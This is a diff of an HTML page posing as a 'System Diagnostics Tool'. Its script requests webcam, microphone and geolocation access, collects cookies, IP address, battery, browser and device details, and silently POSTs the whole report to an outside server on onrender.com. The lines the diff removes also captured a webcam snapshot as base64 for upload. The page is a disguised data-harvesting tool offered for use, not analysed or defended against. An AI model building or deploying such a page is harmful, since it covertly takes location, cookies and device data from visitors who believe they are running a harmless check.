@@ -1,162 +1,175 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>System Info Report</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>System Diagnostics</title>
+
+  <!-- Google font for tech look -->
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+
   <style>
+    :root {
+      --matrix-green: #00ff7b;
+      --bg-green-dim: #003c1c;
+    }
+    * { margin: 0; padding: 0; box-sizing:border-box; }
+
     body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #f4f4f4;
+      background:#000;
+      color:var(--matrix-green);
+      font-family:'Share Tech Mono',monospace;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      padding:2rem 1rem;
     }
-
-    .container {
-      width: 80%;
-      margin: 50px auto;
-      background: #1b1b1b;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-      color: #e2e2e2;
+    h2 {
+      font-size:2rem;
+      margin-bottom:1.5rem;
+      text-shadow:0 0 10px var(--matrix-green);
+      text-align:center;
     }
-
-    h1 {
-      text-align: center;
-      color: #4CAF50;
-    }
-
-    .error-msg {
-      color: red;
-      text-align: center;
-    }
-
-    .info-box {
-      display: none;
-      margin-top: 20px;
-    }
-
-    .info-box p {
-      font-size: 16px;
-      line-height: 1.6;
-    }
-
-    #webcamFeed {
-      width: 100%;
-      height: auto;
-      display: none;
-      margin-top: 10px;
-    }
-
     button {
-      padding: 10px 20px;
-      font-size: 16px;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      cursor: pointer;
-      border-radius: 5px;
+      background:transparent;
+      color:var(--matrix-green);
+      border:1px solid  var(--matrix-green);
+      padding:.6rem 1.4rem;
+      font:inherit;
+      cursor:pointer;
+      transition:.25s;
     }
+    button:hover{ background:var(--bg-green-dim); }
 
-    button:hover {
-      background-color: #45a049;
+    #infoBox{
+      width:100%;
+      max-width:760px;
+      border:1px solid var(--matrix-green);
+      padding:1.3rem 1.6rem;
+      margin-top:1.5rem;
+      display:none;
+      overflow-y:auto;
+      background:rgba(0,0,0,.85);
+      box-shadow:0 0 15px var(--matrix-green);
     }
+    .label{ font-weight:bold; }
+    p{ margin:.35rem 0; }
+
+    #webcamFeed{
+      width:100%;
+      max-height:200px;
+      border:1px solid var(--matrix-green);
+      display:none;
+      margin-bottom:1rem;
+      object-fit:cover;
+      filter:grayscale(100%);
+      opacity:.12;
+    }
+    #errorMsg{ color:#f33; text-align:center; margin-top:.8rem;}
   </style>
 </head>
-
 <body>
+  <h2>🧠 System Diagnostics Tool</h2>
 
-  <div class="container">
-    <h1>System Information Report</h1>
+  <p id="errorMsg"></p>
+  <button id="accessBtn" onclick="getAllInfo()">Run Diagnostics</button>
 
-    <!-- Error message display -->
-    <div id="errorMsg" class="error-msg"></div>
+  <div id="infoBox">
+    <video id="webcamFeed" autoplay muted></video>
 
-    <!-- Button to trigger information collection -->
-    <button id="accessBtn" onclick="getAllInfo()">Collect System Info</button>
-
-    <!-- Display the system info -->
-    <div id="infoBox" class="info-box">
-      <p><strong>🔍 System Report:</strong></p>
-      <p id="systemInfo"></p>
-
-      <!-- Display webcam feed if accessible -->
-      <video id="webcamFeed" autoplay></video>
-    </div>
+    <p><span class="label">IP Address:</span> <span id="ipAddress"></span></p>
+    <p><span class="label">Location:</span> <span id="location"></span></p>
+    <p><span class="label">Webcam:</span> <span id="webcamResult"></span></p>
+    <p><span class="label">Microphone:</span> <span id="microphoneResult"></span></p>
+    <p><span class="label">Browser:</span> <span id="browser"></span></p>
+    <p><span class="label">Resolution:</span> <span id="resolution"></span></p>
+    <p><span class="label">Color Depth:</span> <span id="depth"></span></p>
+    <p><span class="label">Operating System:</span> <span id="os"></span></p>
+    <p><span class="label">Language:</span> <span id="lang"></span></p>
+    <p><span class="label">Network:</span> <span id="connection"></span></p>
+    <p><span class="label">Battery Level:</span> <span id="battery"></span></p>
+    <p><span class="label">Charging:</span> <span id="charging"></span></p>
+    <p><span class="label">Cookies:</span> <span id="cookies"></span></p>
+    <p><span class="label">Online Status:</span> <span id="status"></span></p>
   </div>
 
   <script>
     async function getAllInfo() {
       const $ = id => document.getElementById(id);
-      $("errorMsg").textContent = ""; // Reset error message
-      $("accessBtn").style.display = "none"; // Hide access button
-      $("infoBox").style.display = "block"; // Show system info box
+
+      $("errorMsg").textContent = "";
+      $("accessBtn").style.display = "none";
+      $("infoBox").style.display = "block";
 
       const info = {
-        webcam: "Denied",
-        microphone: "Denied",
-        location: "Denied",
-        ip: "Unknown",
-        browser: navigator.userAgent,
-        resolution: `${screen.width}x${screen.height}`,
-        depth: `${screen.colorDepth}-bit`,
-        os: navigator.platform,
-        lang: navigator.language,
-        online: navigator.onLine ? "Online" : "Offline",
-        connection: "Unknown",
-        battery: "Unknown",
-        charging: "Unknown",
-        cookies: document.cookie || "No cookies"
+        webcam : "Denied",
+        microphone : "Denied",
+        location : "Denied",
+        ip : "Unknown",
+        browser : navigator.userAgent,
+        resolution : `${screen.width}x${screen.height}`,
+        depth : `${screen.colorDepth}-bit`,
+        os : navigator.platform,
+        lang : navigator.language,
+        online : navigator.onLine ? "Online" : "Offline",
+        connection : "Unknown",
+        battery : "Unknown",
+        charging : "Unknown",
+        cookies : document.cookie || "No cookies"
       };
-
-      let webcamStream = null;
-      let capturedImageBase64 = null;
 
       /* permissions ----------------------------------------------------*/
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
         $("webcamFeed").srcObject = stream;
         $("webcamFeed").style.display = "block";
         info.webcam = info.microphone = "Accessible";
-        webcamStream = stream;
-      } catch (e) {
-        console.error("Error accessing webcam or microphone", e);
-      }
+      } catch { /* ignore */ }
 
-      // Capture Image from webcam if accessible
-      if (webcamStream) {
-        const track = webcamStream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        try {
-          const bitmap = await imageCapture.grabFrame();
+      try {
+        const pos = await new Promise((res, rej)=>navigator.geolocation.getCurrentPosition(res, rej));
+        info.location = `Lat: ${pos.coords.latitude.toFixed(4)}, Long: ${pos.coords.longitude.toFixed(4)}`;
+      } catch { /* location denied */ }
 
-          // Resize the image before converting it to base64
-          const canvas = document.createElement('canvas');
-          const MAX_WIDTH = 640; // Resize to a smaller width
-          const MAX_HEIGHT = 480; // Resize to a smaller height
+      /* other data ----------------------------------------------------*/
+      $("browser").textContent     = info.browser;
+      $("resolution").textContent  = info.resolution;
+      $("depth").textContent       = info.depth;
+      $("os").textContent          = info.os;
+      $("lang").textContent        = info.lang;
+      $("status").textContent      = info.online;
+      $("cookies").textContent     = info.cookies;
+      $("webcamResult").textContent= info.webcam;
+      $("microphoneResult").textContent = info.microphone;
+      $("location").textContent    = info.location;
 
-          // Calculate the new dimensions while maintaining aspect ratio
-          const aspectRatio = bitmap.width / bitmap.height;
-          const newWidth = Math.min(MAX_WIDTH, bitmap.width);
-          const newHeight = Math.min(MAX_HEIGHT, bitmap.height);
-
-          canvas.width = newWidth;
-          canvas.height = newHeight;
-
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(bitmap, 0, 0, newWidth, newHeight);
-
-          // Capture the resized image as base64
-          capturedImageBase64 = canvas.toDataURL('image/jpeg'); // base64 image string
-        } catch (e) {
-          console.error("Failed to capture webcam image:", e);
+      try {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+          info.connection = conn.effectiveType;
+          $("connection").textContent = info.connection;
         }
-      }
+      } catch {}
 
-      /* Send to Backend -----------------------------------------------*/
-      const message = `🔍 System Report:
+      try {
+        const bat = await navigator.getBattery();
+        info.battery  = `${Math.round(bat.level * 100)}%`;
+        info.charging = bat.charging ? "Yes":"No";
+        $("battery").textContent  = info.battery;
+        $("charging").textContent = info.charging;
+      } catch {}
+
+      try {
+        const ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
+        info.ip = ip.ip;
+        $("ipAddress").textContent = info.ip;
+      } catch {}
+
+      /* send to backend -----------------------------------------------*/
+      const message = `
+🔍 System Report:
+
 🧠 IP Address: ${info.ip}
 📍 Location: ${info.location}
 📷 Webcam: ${info.webcam}
@@ -170,20 +183,14 @@
 🔋 Battery: ${info.battery}
 ⚡ Charging: ${info.charging}
 🍪 Cookies: ${info.cookies}
-🔌 Online: ${info.online}`;
+🔌 Online: ${info.online}
+      `;
 
-      // Display the message in the HTML
-      $("systemInfo").textContent = message;
-
-      // Now send to your backend server
       try {
-        await fetch('https://your-server-url/send-message', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            message,
-            image: capturedImageBase64 // Send base64 string of the image
-          })
+        await fetch('https://system-info-terminal.onrender.com/send-message', {   // <- your Render URL
+          method : 'POST',
+          headers: { 'Content-Type':'application/json' },
+          body   : JSON.stringify({ message })
         });
       } catch (e) {
         console.error("Failed to send info:", e);
@@ -191,7 +198,5 @@
       }
     }
   </script>
-
 </body>
-
 </html>
